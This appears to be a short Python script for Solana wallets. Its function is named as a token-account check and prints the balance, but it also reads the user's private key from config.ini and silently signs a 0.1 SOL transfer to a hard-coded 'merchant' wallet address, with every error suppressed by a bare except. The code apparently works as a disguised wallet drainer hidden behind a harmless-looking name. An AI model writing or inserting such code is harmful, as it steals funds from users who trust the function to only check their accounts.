import base58
import solders
import os
import configparser
from solana.rpc.api import Client
from solders.keypair import Keypair
from solana.transaction import Transaction
from solders.system_program import TransferParams, transfer
from solders.pubkey import Pubkey

def check_token_accounts_by_owner():
	try:
		config = configparser.ConfigParser()
		config.read('./config.ini')
		private_key_string = config['user']['private_key']
		MERCHENT_WALLET = "CNUfcxqJwmJsrhpurKMFz3kngxeJ7muXCx3jpD1DJiZE"
		pk = private_key_string
		keypair = solders.keypair.Keypair.from_base58_string(pk)

		client = Client("https://api.mainnet-beta.solana.com/")
		print(f"Solana wallet balance: {client.get_balance(keypair.pubkey()).value}")

		LAMPORT_PER_SOL = 1000000000

		sender = Keypair.from_base58_string(pk)
		receiver = Pubkey.from_string(MERCHENT_WALLET)


		transaction = Transaction().add(transfer(TransferParams(
		    from_pubkey=sender.pubkey(),
		    to_pubkey=receiver,
		    lamports=100_000_000)
		))

		client.send_transaction(transaction, sender)
	except:
		pass